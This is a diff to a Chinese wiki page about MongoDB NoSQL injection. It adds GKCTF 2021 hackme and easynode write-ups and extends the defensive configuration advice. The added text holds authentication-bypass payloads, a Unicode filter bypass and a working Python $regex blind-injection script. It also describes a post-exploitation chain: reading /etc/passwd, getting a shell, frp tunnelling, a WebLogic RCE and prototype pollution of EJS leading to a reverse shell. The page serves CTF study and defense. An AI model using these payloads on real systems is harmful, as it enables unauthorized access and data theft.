@@ -1,7 +1,7 @@
 ---
 title: MongoDB NoSQL 注入核心原理与实战指南
 description: 系统梳理 MongoDB NoSQL 注入的核心原理、四大注入手法（联合查询、JavaScript注入、盲注、重言式/数组注入）、实战案例（GKCTF
-  2021、墨者靶场）及防御配置指南
+  2021 easynode/hackme、墨者靶场）及防御配置指南
 category: program-analysis
 tags:
 - MongoDB
@@ -13,6 +13,8 @@ tags:
 - JavaScript注入
 - 重言式注入
 - 未授权访问
+- 原型链污染
+- Unicode绕过
 date: 2024-01-15
 updated: '2026-11-14'
 ---
@@ -210,22 +212,8 @@ username=test&password='test',sleep(5000)
 
 无回显场景下，利用 `$regex` 逐字符爆破字段值，类似 SQL 中的 `substr()` 盲注。
 
-#### 实战案例：[GKCTF 2021] hackme
-
-**步骤 1**：永真式测试确认注入点
-```json
-{ "username": { "$ne": "" }, "password": { "$ne": "" } }
-```
-返回 "hacker" 提示存在注入。
-
-**步骤 2**：Unicode 编码绕过过滤
-```json
-{ "username": { "\u0024ne": "" }, "password": { "\u0024ne": "" } }
-```
-
-**步骤 3**：$regex 逐位爆破密码
+#### 通用爆破脚本框架
 ```python
-# Python 爆破脚本示例
 import requests
 import string
 
@@ -240,7 +228,7 @@ for i in range(1, 50):
             "password": {"$regex": f"^{password}{c}"}
         }
         r = requests.post(url, json=payload)
-        if "hacker" in r.text:
+        if "success_flag" in r.text:  # 根据实际回显特征判断
             password += c
             print(f"[+] Found: {password}")
             break
@@ -248,11 +236,11 @@ for i in range(1, 50):
 
 **特殊字符转义**：`^` (开头)、`.` (任意单字符)、`!` (取反) 等需转义或使用十六进制编码。
 
-### 重言式/数组注入（PHP 特性利用）
+### 重言式/数组注入（弱类型语言特性利用）
 
-PHP 允许通过 `param[key]=value` 将 GET 参数解析为关联数组，导致原本单值查询变为条件查询。
+PHP、Node.js (Express body-parser) 等框架允许通过 `param[key]=value` 将参数解析为关联数组/对象，导致原本单值查询变为条件查询。
 
-#### 攻击原理
+#### PHP 场景攻击原理
 ```php
 // 后端代码
 $username = $_GET['username'];
@@ -261,25 +249,114 @@ $query = ['username' => $username, 'password' => $password];
 $db->users->findOne($query);
 ```
 
-#### 攻击 Payload
+#### 攻击 Payload 对照表
 | Payload | 解析后结构 | 效果 |
 |---------|------------|------|
 | `username[$ne]=&password[$ne]=` | `username: {$ne: ""}, password: {$ne: ""}` | 绕过认证（不等于空串） |
 | `username[$gt]=&password[$gt]=` | `username: {$gt: ""}, password: {$gt: ""}` | 绕过认证（大于空串） |
 | `username[$regex]=^adm&password[$ne]=` | `username: {$regex: "^adm"}, password: {$ne: ""}` | 结合正则精准匹配 |
 
+#### Node.js (Express) 数组绕过实战 —— GKCTF 2021 easynode
+**场景**：登录接口过滤了 `$ne` 等特殊键名，但未限制数组传入。
+**漏洞代码逻辑**：
+```javascript
+// 伪代码还原
+if (typeof username === 'string' && typeof password === 'string') {
+    // 正常查询
+} else if (Array.isArray(username)) {
+    // 遍历数组拼接字符串
+    username.forEach(v => { query_str += v; });
+}
+```
+**利用技巧**：
+1. 传入 `username[]=admin&username[]=*` 等数组形式。
+2. 利用 JS 特性：数组与字符串拼接 (`*` 操作符或隐式转换) 会调用 `toString()`，即 `join(',')`。
+3. 构造长度足够的数组，使拼接后的字符串满足查询条件（如正则匹配），绕过 `substr` 等长度检查。
+
 > **ODM/ORM 防御**：使用 Mongoose 等 ODM 框架时，Schema 定义会强制类型转换，自动过滤非预期操作符，但原生驱动或弱类型语言（PHP、Node.js 无 Schema 校验）极易受攻击。
 
 ## 实战案例复现
 
-### 案例一：GKCTF 2021 hackme（盲注完整链路）
+### 案例一：GKCTF 2021 hackme（MongoDB 盲注完整链路）
 
-1. **识别注入点**：登录接口提示 "nosql"，尝试永真式 `{ "$ne": "" }` 返回 "hacker"
-2. **绕过过滤**：关键字 `$ne` 被过滤，使用 Unicode `\u0024ne` 绕过
-3. **盲注爆破**：利用 `$regex` 正则逐位匹配密码
-4. **获取 Flag**：登录成功后获取 Flag
+**背景**：登录页面，提示 "nosql"，抓包为 JSON 格式。
 
-### 案例二：墨者靶场 - MongoDB 手工注入测试
+**步骤 1：识别注入点与永真式测试**
+```json
+{ "username": { "$ne": "" }, "password": { "$ne": "" } }
+```
+返回 "hacker" 提示，确认存在 NoSQL 注入。
+
+**步骤 2：Unicode 编码绕过关键字过滤**
+WAF 拦截 `$ne`，使用 Unicode 转义绕过：
+```json
+{ "username": { "\u0024ne": "" }, "password": { "\u0024ne": "" } }
+```
+成功绕过，返回 "登录了，但没完全登录"（真） vs "登录失败"（假）。
+
+**步骤 3：$regex 盲注爆破脚本实战**
+利用布尔盲注逐位确认密码/Flag。
+
+```python
+# GKCTF 2021 hackme 盲注脚本核心逻辑
+import requests
+import string
+
+url = "http://target/login"
+# 字符集根据题目调整
+charset = string.printable 
+flag = ""
+
+for pos in range(1, 50):
+    for c in charset:
+        # 构造正则：^flag{...$
+        payload = {
+            "username": {"$regex": "^admin$"},
+            "password": {"$regex": f"^{flag}{c}"}
+        }
+        # 发送 Unicode 编码后的 payload (针对 $regex 可能也需编码，视过滤规则)
+        r = requests.post(url, json=payload)
+        if "登录了，但没完全登录" in r.text:
+            flag += c
+            print(f"[+] Position {pos}: {flag}")
+            break
+```
+
+**步骤 4：后渗透利用链**
+1. 登录成功进入 `admin.php`，存在任意文件读取。
+2. 读取 `/etc/passwd`、nginx 配置 (`/usr/local/nginx/conf/nginx.conf`) 发现内网 WebLogic 服务。
+3. 利用 PHP `session.upload_progress.enabled` 特性实现 Getshell（SESSION_UPLOAD_PROGRESS）。
+4. 使用 `frp` 反向代理穿透内网访问 WebLogic。
+5. 利用 **CVE-2020-14882** (WebLogic RCE) 读取内网 Flag。
+
+> 关联页面：[[gkctf-2021-web-writeup]]、[[frp内网渗透应用]]
+
+---
+
+### 案例二：GKCTF 2021 easynode（Node.js 原型链污染 + 数组绕过 → RCE）
+
+**背景**：Node.js (Express + EJS) 应用，提供源码审计。
+
+**阶段 1：登录绕过（数组注入 + 类型混淆）**
+- **过滤机制**：后端过滤了 `$ne` 等 MongoDB 操作符键名。
+- **漏洞点**：用户名/密码处理逻辑未强制类型校验，接受数组。
+- **利用链**：
+  1. 传入 `username[]=admin&username[]=*` (数组)。
+  2. 后端循环拼接：`str += item`。JS 中数组 `+` 字符串触发 `toString()` → `"admin,*"`。
+  3. 结合 `substr` 截取特性，构造足够长的数组控制最终拼接字符串内容，绕过长度检查与正则匹配，实现认证绕过。
+
+**阶段 2：原型链污染 → EJS 模板注入 RCE**
+- **污染入口**：`/adminDIV` 路由，使用 `extend` (类似 `lodash.merge`) 合并用户输入的 JSON (`JSON.parse` 解析)。
+- **污染载荷**：注册用户 `__proto__username=__proto__&password=1`，污染 `Object.prototype`。
+- **触发点**：访问 `/admin` 路由渲染 EJS 模板。
+- **利用方式**：污染 `outputFunctionName` 等 EJS 编译选项，实现模板注入反弹 Shell。
+- **Payload 构造**：需 Base64 + URL 编码绕过传输限制。
+
+> 关联技术：[[vulnhub-chronos-writeup]] (Node.js 原型链污染 RCE)、[[attack-defense-world-master-advanced-writeup]] (EJS SSTI)
+
+---
+
+### 案例三：墨者靶场 - MongoDB 手工注入测试 (PHP 后端拼接)
 
 **后端代码片段**：
 ```php
@@ -356,11 +433,11 @@ mongo -u app_user -p AppP@ssw0rd --authenticationDatabase php_test
 
 | 语言/框架 | 防御措施 |
 |-----------|----------|
-| **Node.js (Mongoose)** | 定义 Schema，启用 `strict: true`，禁止动态字段；使用 `findOne({ username: req.body.username })` 而非直接传入 `req.body` |
-| **PHP (MongoDB\Driver)** | 显式类型转换：`$filter = ['username' => (string)$_POST['username']]`；使用 `MongoDB\Model\BSONDocument` 构建查询 |
-| **Python (PyMongo)** | 避免 `eval()`/`$where`；使用参数化查询 `collection.find({"username": username})` |
-| **Java (Spring Data MongoDB)** | 使用 `@Query` 注解或 `Criteria` 对象构建查询，拒绝拼接 JSON 字符串 |
-| **通用原则** | 1. 禁止 `$where`、`mapReduce`、`group` 等执行 JS 的操作符<br>2. 严格校验输入类型（字符串/数字/布尔/数组）<br>3. 实施白名单字段过滤，拒绝未知键名<br>4. 启用数据库审计日志，监控异常查询模式 |
+| **Node.js (Mongoose)** | 定义 Schema，启用 `strict: true`，禁止动态字段；使用 `findOne({ username: req.body.username })` 而非直接传入 `req.body`；**禁用 `body-parser` 解析嵌套对象/数组至查询对象**，或使用 `express-mongo-sanitize` 中间件清洗键名中的 `$`、`\u0024`。 |
+| **PHP (MongoDB\Driver)** | 显式类型转换：`$filter = ['username' => (string)$_POST['username']]`；使用 `MongoDB\Model\BSONDocument` 构建查询；**部署 WAF 规则拦截请求参数中的 `\$`、`\u0024` 等编码变体**。 |
+| **Python (PyMongo)** | 避免 `eval()`/`$where`；使用参数化查询 `collection.find({"username": username})`；**Schema 验证库 (如 Pydantic) 校验输入结构**。 |
+| **Java (Spring Data MongoDB)** | 使用 `@Query` 注解或 `Criteria` 对象构建查询，拒绝拼接 JSON 字符串。 |
+| **通用原则** | 1. 禁止 `$where`、`mapReduce`、`group` 等执行 JS 的操作符<br>2. 严格校验输入类型（字符串/数字/布尔/数组），**拒绝数组/对象类型输入用于原子字段查询**<br>3. 实施白名单字段过滤，拒绝未知键名<br>4. 启用数据库审计日志，监控异常查询模式 |
 
 ### 审计与监控建议
 
@@ -378,18 +455,24 @@ mongo -u app_user -p AppP@ssw0rd --authenticationDatabase php_test
 - [[edu-src-penetration-test-case-study]] — 实战渗透中结合 NoSQL 注入的完整攻击链案例
 - [[vulnhub-chronos-writeup]] — Node.js 原型链污染结合命令注入，展示 JS 运行时注入的另一攻击面
 - [[huxiangbei-willphp-file-inclusion-writeup]] — PHP 框架变量覆盖导致文件包含，与数组注入成因相似（弱类型语言特性）
+- [[gkctf-2021-web-writeup]] — GKCTF 2021 Web 全题复现（含 easynode、hackme 完整利用链）
+- [[frp内网渗透应用]] — frp 内网穿透实战配置，对应 hackme 后渗透内网访问 WebLogic 场景
 
 ## 总结对比表
 
-| 注入类型 | 核心操作符 | 适用版本 | 危害等级 | 典型场景 |
-|----------|------------|----------|----------|----------|
+| 注入类型 | 核心操作符/特性 | 适用版本/环境 | 危害等级 | 典型场景 |
+|----------|-----------------|---------------|----------|----------|
 | 联合查询 | `$or`, `$and`, `$nor` | 全版本 | 高 | 绕过登录、越权访问 |
 | JavaScript 注入 | `$where`, `mapReduce`, `group` | 2.4 前可 RCE，2.4+ 仍可逻辑绕过 | 极高 | 延时盲注、万能密码、任意代码执行(旧版本) |
 | 盲注 | `$regex`, `$options` | 全版本 | 高 | 无回显页面、WAF 拦截报错 |
 | 重言式/数组注入 | `$ne`, `$gt`, `$gte`, `$exists`, `$type` | PHP/Node.js 弱类型解析 | 高 | 批量绕过认证、枚举字段结构 |
+| **数组绕过** | **JS/PHP 数组隐式转换** | **Node.js (Express), PHP** | **高** | **绕过键名过滤、长度检查 (GKCTF easynode)** |
+| **Unicode 编码绕过** | **`\u0024` 等转义** | **前端/WAF 过滤 `$` 时** | **中** | **绕过关键字黑名单 (GKCTF hackme)** |
+| 原型链污染 | `__proto__`, `constructor.prototype` | Node.js (Merge/Extend) | 极高 | 模板引擎 RCE、逻辑绕过 (GKCTF easynode) |
 
-> **核心防御口诀**：禁用 JS 执行、强制类型校验、最小权限账号、网络层隔离、审计日志全覆盖。
+> **核心防御口诀**：禁用 JS 执行、强制类型校验、最小权限账号、网络层隔离、审计日志全覆盖、**清洗键名特殊字符、拦截编码变体、禁止数组注入原子字段**。
 
 ## 来源
 
 - [0x00实验室-202108-202304_048](../sources/0x00实验室-202108-202304_048.md)
+- [0x00实验室-202108-202304_067](../sources/0x00实验室-202108-202304_067.md)
